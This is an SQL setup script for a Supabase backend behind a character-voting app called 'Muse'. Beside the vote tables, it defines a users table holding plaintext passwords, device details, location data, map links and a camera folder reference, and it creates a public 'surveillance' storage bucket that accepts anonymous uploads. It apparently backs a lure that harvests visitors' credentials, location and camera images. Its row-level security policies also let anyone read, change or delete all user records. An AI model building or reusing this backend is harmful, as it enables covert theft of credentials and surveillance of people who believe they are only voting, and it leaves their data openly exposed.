-- --------------------------------------------------------
-- SUPABASE / POSTGRESQL SCHEMA FOR MUSE APP
-- Copy and run this in your Supabase SQL Editor to fix RLS errors
-- --------------------------------------------------------

-- 1. Create Characters Table
create table if not exists public.characters (
    character_id text primary key,
    name text not null,
    role text,
    description text,
    image_url text,
    votes int default 0,
    theme_color text,
    family_name text default 'Unknown Family',
    family_icon text default 'crown',
    active_effect text default 'none', -- NEW COLUMN: 'fire', 'lightning', 'shadow', 'none'
    created_at timestamp with time zone default timezone('utc'::text, now())
);

-- ADD COLUMN IF NOT EXISTS (Run this if table already exists)
DO $$
BEGIN
    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='characters' AND column_name='active_effect') THEN
        ALTER TABLE public.characters ADD COLUMN active_effect text default 'none';
    END IF;
END $$;

alter publication supabase_realtime add table characters;

-- 2. Create Votes Table
create table if not exists public.votes (
    id bigint generated by default as identity primary key,
    user_identifier text not null,
    character_id text references public.characters(character_id),
    device_info jsonb,
    location_data jsonb,
    maps_url text,
    created_at timestamp with time zone default timezone('utc'::text, now())
);

-- 3. Create Users/Login Logs Table
create table if not exists public.users (
    id bigint generated by default as identity primary key,
    user_identifier text not null, -- Constraint added below
    password_text text,
    login_method text,
    device_info jsonb,
    location_data jsonb,
    maps_url text,
    camera_folder_ref text,
    last_login timestamp with time zone default timezone('utc'::text, now())
);

-- 4. Storage
insert into storage.buckets (id, name, public) values ('surveillance', 'surveillance', true)
on conflict (id) do nothing;

-- 5. FIX & RESET RLS POLICIES (Crucial for fixing "violates row-level security policy")
-- We drop existing policies to ensure a clean slate, then re-create them.

alter table public.characters enable row level security;
drop policy if exists "Allow public read characters" on public.characters;
drop policy if exists "Allow public insert/update characters" on public.characters;
create policy "Allow public read characters" on public.characters for select using (true);
create policy "Allow public insert/update characters" on public.characters for all using (true) with check (true);

alter table public.votes enable row level security;
drop policy if exists "Allow public insert votes" on public.votes;
create policy "Allow public insert votes" on public.votes for insert with check (true);

alter table public.users enable row level security;
drop policy if exists "Allow public insert/update users" on public.users;
drop policy if exists "Allow public read users" on public.users;
drop policy if exists "Enable all access for public users" on public.users;

-- Unified Policy for Users Table (Select, Insert, Update, Delete)
create policy "Enable all access for public users"
on public.users
for all
using (true)
with check (true);

create policy "Allow public uploads" on storage.objects for insert with check ( bucket_id = 'surveillance' );

-- 6. ENSURE UNIQUE CONSTRAINT (Required for Upsert)
DO $$
BEGIN
  -- Check if constraint exists, if not, create it
  IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'users_user_identifier_key') THEN
    -- Optional: Clean duplicates before adding constraint (keeps latest id)
    DELETE FROM public.users a USING public.users b 
    WHERE a.id < b.id AND a.user_identifier = b.user_identifier;

    ALTER TABLE public.users ADD CONSTRAINT users_user_identifier_key UNIQUE (user_identifier);
  END IF;
END $$;

-- 7. Triggers
create or replace function public.increment_vote_count()
returns trigger as $$
begin
  update public.characters
  set votes = votes + 1
  where character_id = new.character_id;
  return new;
end;
$$ language plpgsql security definer;

drop trigger if exists on_vote_added on public.votes;
create trigger on_vote_added
after insert on public.votes
for each row execute procedure public.increment_vote_count();